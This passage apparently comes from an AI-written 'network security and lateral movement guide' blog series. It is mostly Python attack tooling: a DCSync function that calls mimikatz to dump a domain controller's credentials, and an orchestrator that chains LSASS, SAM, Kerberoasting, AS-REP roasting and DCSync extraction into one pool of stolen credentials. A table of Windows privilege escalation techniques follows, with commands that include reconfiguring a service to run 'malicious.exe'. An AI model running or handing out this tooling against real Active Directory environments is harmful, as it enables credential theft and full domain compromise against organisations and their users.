    def dcsync_attack(self, domain_controller, target_user="Administrator"):
        """Execute DCSync attack"""
        if self.privilege_level not in ["SYSTEM/Admin"]:
            return {"error": "High privileges required for DCSync"}
        
        dcsync_result = []
        
        try:
            # Use mimikatz for DCSync
            mimikatz_cmd = [
                'mimikatz.exe',
                f'lsadump::dcsync /domain:{domain_controller} /user:{target_user}',
                'exit'
            ]
            
            result = subprocess.run(mimikatz_cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                dcsync_result = self.parse_dcsync_output(result.stdout)
        
        except Exception as e:
            dcsync_result.append({"error": str(e)})
        
        return {
            "technique": "DCSync",
            "result": dcsync_result,
            "privilege_required": "Domain Admin"
        }
    
    def comprehensive_credential_harvest(self, domain_controller=None):
        """Execute comprehensive credential harvesting"""
        harvest_results = {
            "lsass_extraction": self.harvest_lsass_memory(),
            "sam_extraction": self.extract_sam_database(),
            "powershell_extraction": self.powershell_credential_extraction()
        }
        
        if domain_controller:
            harvest_results["kerberoasting"] = self.kerberoast_attack(domain_controller)
            harvest_results["asreproasting"] = self.asreproast_attack(domain_controller)
            harvest_results["dcsync"] = self.dcsync_attack(domain_controller)
        
        # Consolidate all harvested credentials
        all_credentials = []
        for technique, result in harvest_results.items():
            if "credentials" in result:
                all_credentials.extend(result["credentials"])
            elif "hashes" in result:
                all_credentials.extend(result["hashes"])
            elif "tickets" in result:
                all_credentials.extend(result["tickets"])
        
        self.harvested_credentials = all_credentials
        
        return {
            "summary": {
                "total_credentials": len(all_credentials),
                "techniques_used": list(harvest_results.keys()),
                "privilege_level": self.privilege_level
            },
            "detailed_results": harvest_results,
            "consolidated_credentials": all_credentials
        }

def generate_privilege_escalation_techniques():
    """Generate Windows privilege escalation techniques"""
    
    privesc_techniques = {
        "service_permissions": {
            "description": "Exploit weak service permissions",
            "commands": [
                "sc qc <service_name>",
                "accesschk.exe -ucqv <service_name>",
                "sc config <service_name> binpath= \"C:\\temp\\malicious.exe\""
            ],
            "requirements": "Service modification permissions"
        },
        
        "unquoted_service_paths": {
            "description": "Exploit unquoted service paths",
            "detection": 'wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\\windows\\\\" |findstr /i /v """"',
            "exploitation": "Place malicious executable in path with spaces",
            "requirements": "Write access to service path"
        },
        
        "always_install_elevated": {
            "description": "Exploit AlwaysInstallElevated registry setting",
            "detection": [
                'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
                'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated'
            ],
            "exploitation": "Install malicious MSI package",
            "requirements": "AlwaysInstallElevated enabled"
        },
        
        "weak_registry_permissions": {
            "description": "Exploit weak registry permissions",
            "detection": "accesschk.exe -uvwqk HKLM\\System\\CurrentControlSet\\Services",
            "exploitation": "Modify service registry entries",
            "requirements": "Registry modification permissions"
        },
        
        "dll_hijacking": {
            "description": "DLL hijacking privilege escalation",
            "detection": "Process Monitor (ProcMon) to identify missing DLLs",
            "exploitation": "Place malicious DLL in application directory",
            "requirements": "Write access to application directory"
        },
        
        "kernel_exploits": {
            "description": "Kernel-level privilege escalation",
            "examples": [
                "MS16-032 (Secondary Logon)",
                "MS16-135 (Windows Kernel)",
                "MS17-017 (GDI Palette Objects)"
            ],
            "requirements": "Vulnerable kernel version"
        },
        
        "token_impersonation": {
            "description": "Token impersonation attacks",
            "techniques": [
                "SeImpersonatePrivilege abuse",
                "SeAssignPrimaryTokenPrivilege abuse", 
                "Potato attacks (Hot Potato, Rotten Potato, Juicy Potato)"
            ],
            "requirements": "Service account or specific privileges"
        }
    }
    
    return privesc_techniques
```

This comprehensive network security and lateral movement guide provides practical frameworks and techniques for advanced post-exploitation activities. The content covers systematic network reconnaissance, credential harvesting, privilege escalation, and lateral movement techniques used in real-world engagements.

Let me continue with the next blog on Cryptography & Privacy Engineering.
